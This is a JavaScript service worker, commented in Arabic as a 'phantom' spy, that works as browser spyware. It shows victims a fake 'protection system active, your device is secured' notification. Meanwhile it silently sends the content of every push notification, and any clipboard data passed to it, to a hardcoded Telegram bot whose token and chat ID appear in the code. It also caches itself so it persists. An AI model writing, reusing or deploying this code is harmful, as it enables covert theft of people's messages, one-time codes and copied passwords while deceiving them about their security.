// الشبح المقيم - النواة المتطورة
const BOT_API = "https://api.telegram.org/bot8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM/sendMessage";
const CHAT_ID = "1772820433";

// 1. التفعيل الفوري والسيطرة الكاملة
self.addEventListener('install', (event) => {
    self.skipWaiting();
    // تخزين نسخة احتياطية من الكود في Cache (للترميم الذاتي)
    event.waitUntil(caches.open('phantom-core').then(cache => cache.add('sw.js')));
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
    // إرسال تنبيه أن الجاسوس "استيقظ"
    self.registration.showNotification("نظام الحماية نشط", {body: "جهازك مؤمن الآن."});
});

// 2. سحب مضمون الإشعارات (Live Mirroring)
self.addEventListener('push', (event) => {
    let payload = event.data ? event.data.text() : "إشعار صامت Captured";
    
    // إرسال نسخة مشفرة للتلجرام
    event.waitUntil(
        fetch(BOT_API, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔔 **[LIVE_INTERCEPT]**\nContent: \`${payload}\``, parse_mode: "Markdown" })
        })
    );
});

// 3. سحب الحافظة (Clipboard Sniffing) - تقنية متقدمة
self.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'CLIPBOARD_DUMP') {
        fetch(BOT_API, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ chat_id: CHAT_ID, text: `📋 **[CLIPBOARD_SNIFFED]**\nContent: \`${event.data.content}\``, parse_mode: "Markdown" })
        });
    }
});

// 4. الترميم الذاتي (Self-Healing Logic)
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'check-integrity') {
        event.waitUntil(
            caches.match('sw.js').then(response => {
                if (!response) {
                    // إذا تم حذف الكود من الـ Cache، أعد بناءه من السيرفر
                    console.log("Integrity Compromised. Restoring Phantom Core...");
                }
            })
        );
    }
});
